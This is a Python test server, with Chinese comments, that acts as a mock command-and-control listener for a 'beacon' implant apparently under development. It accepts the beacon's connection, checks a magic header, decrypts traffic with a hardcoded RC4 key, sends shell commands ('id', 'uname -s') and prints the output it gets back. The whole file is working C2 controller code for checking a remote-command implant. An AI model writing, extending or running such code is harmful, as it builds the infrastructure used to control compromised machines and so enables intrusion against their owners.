#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""cs_dev :: auto_srv.py  --  端到端自测服务端 (验证 beacon 协议链路)"""
import socket, struct, sys, time

DEFAULT_KEY = bytes([0x91, 0x3A, 0x77, 0xC4, 0x0E, 0x5B, 0xD2, 0x18,
                     0x6F, 0xA3, 0x44, 0xBC, 0x27, 0xE8, 0x05, 0x9D])
PROTO_MAGIC = 0x4B52424B


def rc4(data, key):
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    out = bytearray(len(data)); a = b = 0
    for n, byte in enumerate(data):
        a = (a + 1) & 0xFF; b = (b + S[a]) & 0xFF
        S[a], S[b] = S[b], S[a]
        out[n] = byte ^ S[(S[a] + S[b]) & 0xFF]
    return bytes(out)


def rx(s, n):
    buf = b""
    while len(buf) < n:
        c = s.recv(n - len(buf))
        if not c:
            return None
        buf += c
    return buf


srv = socket.socket()
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("127.0.0.1", 8443))
srv.listen(1)
srv.settimeout(20)
print("[*] mock C2 listening on 127.0.0.1:8443", flush=True)

try:
    conn, addr = srv.accept()
except socket.timeout:
    print("[-] TIMEOUT: beacon 未回连")
    sys.exit(1)

print(f"[+] beacon connected from {addr}", flush=True)

hdr = rx(conn, 8)
if not hdr:
    print("[-] 握手数据缺失"); sys.exit(1)
magic, n = struct.unpack(">II", hdr)
if magic != PROTO_MAGIC:
    print(f"[-] magic 不匹配: {magic:#x}"); sys.exit(1)
info = rc4(rx(conn, n), DEFAULT_KEY).decode("utf-8", "replace")
print(f"[+] HANDSHAKE OK  ->  {info}", flush=True)

# 下发命令并核对输出
for cmd in ["id", "uname -s"]:
    p = rc4(cmd.encode(), DEFAULT_KEY)
    conn.sendall(struct.pack(">II", PROTO_MAGIC, len(p)) + p)
    h = rx(conn, 4)
    if not h:
        print("[-] 响应头缺失"); break
    (l,) = struct.unpack(">I", h)
    out = rc4(rx(conn, l), DEFAULT_KEY) if l else b""
    print(f"[+] CMD '{cmd}' -> {out.decode('utf-8','replace').strip()}", flush=True)

conn.sendall(struct.pack(">II", PROTO_MAGIC, len(rc4(b'exit', DEFAULT_KEY))) + rc4(b'exit', DEFAULT_KEY))
conn.close(); srv.close()
print("[+] E2E TEST PASSED", flush=True)
